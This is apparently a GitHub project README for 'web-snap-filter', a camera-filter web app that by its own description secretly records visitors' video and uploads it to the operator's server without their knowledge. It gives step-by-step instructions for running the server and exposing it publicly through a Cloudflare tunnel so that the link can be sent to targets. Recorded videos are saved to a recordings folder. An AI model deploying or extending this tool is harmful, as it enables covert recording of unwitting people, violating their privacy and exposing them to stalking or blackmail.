# web-snap-filter
A browser-based camera filter application with real-time effects and spy auto record  video upload to server where you can see the video with out the person using the website knowing 

## Getting Started

### 1. Clone the repository

git clone https://github.com/ujjal-saha/web-snap-filter.git

cd web-snap-filter

### 2. Download `cloudflared`

**Windows (CMD/PowerShell):**

curl.exe -L "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -o cloudflared.exe

**Linux:**

curl -L "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" -o cloudflared

chmod +x cloudflared

**macOS:**

brew install cloudflared

### 3. Verify the installation

**Windows:**

.\cloudflared.exe --version

**Linux/macOS:**

./cloudflared --version

### 4. Install dependencies

pip install -r requirements.txt

### 5. Free up port 8080 (if already in use)

**Windows (PowerShell):**

Get-NetTCPConnection -LocalPort 8080 -State Listen | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }

**Linux/macOS:**

lsof -ti:8080 | xargs kill -9

### 6. Start the server

node server.js

This starts the website on `localhost:8080`, protected by a key that prevents anonymous file/malware uploads to your directory.

### 7. Open a second terminal (same `web-snap-filter` directory) and start the tunnel

**Windows:**

.\cloudflared.exe tunnel --url http://localhost:8080

**Linux/macOS:**

./cloudflared tunnel --url http://localhost:8080

### 8. Get your access key

Copy the key printed in Terminal 1, e.g. `?key=19f3bc499e4f64112de21e52`

Example local URL:

http://localhost:8080/?key=19f3bc499e4f64112de21e52

### 9. Open the public link

Take the `trycloudflare.com` URL from Terminal 2 and append your key:

https://something-random.trycloudflare.com?key=19f3bc499e4f64112de21e52

### Notes

- Anyone using this link needs the key to access the app.

- Once someone uses the app, the recorded video is saved in the same `web-snap-filter` directory.

- A `recordings` folder is created automatically to store these recordings.
